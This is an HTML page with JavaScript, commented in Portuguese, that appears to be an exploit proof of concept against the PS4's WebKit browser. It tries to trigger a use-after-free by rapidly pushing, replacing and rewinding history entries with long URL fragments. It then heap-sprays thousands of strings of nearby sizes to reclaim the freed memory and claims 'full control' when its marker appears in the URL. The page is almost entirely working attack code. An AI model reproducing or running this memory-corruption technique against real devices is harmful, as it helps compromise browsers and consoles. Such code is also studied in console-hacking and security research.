<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit - Size Sliding Spray</title>
<style>
    body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
    button { 
        width: 100%; padding: 15px; background: #222; color: #0f0; 
        border: 2px solid #0f0; font-weight: bold; cursor: pointer; 
    }
    #log { margin-top: 20px; white-space: pre-wrap; border: 1px solid #333; padding: 10px; }
    .success { color: #0ff; font-weight: bold; }
</style>
</head>
<body>

<h3>PS4 WebKit: Size Sliding Reclamation (Shotgun)</h3>
<button onclick="runSlidingExploit()">INICIAR SPRAY DE VARREDURA</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m, cls="") { 
    const s = document.createElement("div");
    if(cls) s.className = cls;
    s.textContent = m;
    logEl.appendChild(s);
}
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// Cria string única para evitar deduplicação
function makeString(char, len) {
    // Subtraímos um pouco para compensar o prefixo variável, mantendo o tamanho total preciso
    let prefix = "IDX" + Math.random().toString().substring(2,5); 
    return prefix + char.repeat(len - prefix.length);
}

async function runSlidingExploit() {
    logEl.innerHTML = "";
    
    // 1. TRIGGER UAF
    log("1. Disparando UAF para abrir o buraco...");
    let size = 977;
    const STEP = 14461;
    let finalSize = 0;

    for(let i = 0; i < 48; i++) {
        let frag = "V".repeat(size); 
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        if(i % 6 === 0) setTimeout(() => history.back(), 0);
        finalSize = size;
        size += STEP;
        await sleep(5);
    }
    
    log(`Tamanho base do UAF: ${finalSize} bytes`);
    
    // 2. SPRAY "SHOTGUN" (Varrer tamanhos próximos)
    log("2. Iniciando Spray de Varredura (-100 a +100 bytes)...");
    
    let spray = [];
    const BASE_TARGET = finalSize; 
    
    // Tenta cobrir a variação de cabeçalhos internos (StringImpl headers)
    // Strings no WebKit têm overhead (geralmente 16 ou 32 bytes)
    // Vamos subtrair o overhead estimado para tentar cair no tamanho bruto do bloco
    
    for(let delta = -100; delta <= 100; delta += 4) {
        let currentSize = BASE_TARGET + delta;
        
        // Criamos 50 cópias de CADA tamanho para garantir saturação
        for(let k = 0; k < 20; k++) {
            // Usamos "W" para identificar visualmente
            spray.push(makeString("W", currentSize));
        }
    }
    
    log(`Spray concluído. Total de strings: ${spray.length}`);
    log("Aguardando estabilização...");
    await sleep(200);

    // 3. CHECAGEM
    let url = document.URL;
    let wCount = 0;
    
    // Varredura rápida
    for(let i=0; i < 2000; i++) {
        if(url[i] === 'W') wCount++;
    }

    if(wCount > 50) {
        log("!!! JACKPOT !!!", "success");
        log("Memória reclamada com sucesso!");
        log(`O WebKit aceitou uma das nossas strings 'W'.`);
        log("Agora temos controle total do conteúdo.");
    } else {
        log("Falha: Ainda vendo 'V'.");
        log("Diagnóstico: O buraco pode ter sido roubado por outro processo interno.");
        log("Tentativa: Aumente o range do loop (ex: -200 a +200).");
    }
    
    window.keepAlive = spray;
}
</script>
</body>
</html>
